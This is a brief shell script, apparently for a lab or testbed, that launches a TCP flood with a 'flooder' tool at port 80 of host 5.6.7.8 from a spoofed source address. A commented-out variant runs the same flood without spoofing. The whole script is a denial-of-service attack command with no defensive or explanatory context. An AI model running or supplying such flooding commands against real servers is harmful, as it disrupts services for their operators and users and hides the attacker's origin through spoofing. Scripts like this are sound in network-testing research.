#!/bin/sh


echo "Starting to flood the server"

# Start flooding
sudo flooder --src 1.1.2.0 --dst 5.6.7.8 --highrate 100 --lowrate 100 --dportmin 80 --dportmax 80 --proto 6


# NO SPOOF
#sudo flooder --dst 5.6.7.8 --proto 6 --dportmin 80 --dportmax 80 --highrate 100 --lowrate 100 --src 1.1.2.4 --scrmask 255.255.255.255